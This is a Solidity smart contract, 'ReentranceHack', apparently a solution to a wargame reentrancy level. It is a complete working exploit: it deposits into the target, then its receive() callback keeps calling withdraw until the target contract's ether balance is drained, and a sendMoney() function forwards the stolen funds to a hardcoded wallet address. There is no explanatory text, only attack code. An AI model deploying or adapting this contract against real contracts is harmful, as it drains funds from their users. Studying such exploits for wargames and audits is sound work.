// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol";

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    receive() external payable;
}

contract ReentranceHack {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) public{
        reentrance = _reentrance;
    }

    function donateAndWithDraw () public payable {
        reentrance.donate.value(msg.value)(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        while(address(reentrance).balance > 0){
            reentrance.withdraw(0.001 ether);
        }
    }

    function balance () public view returns (uint) {
        return address(this).balance;
    }

    function sendMoney() public {
        address aaa = 0xe0dCaA02cF82568F65c01B5789117c5cD665452c;
        payable(aaa).transfer(balance());
    }
}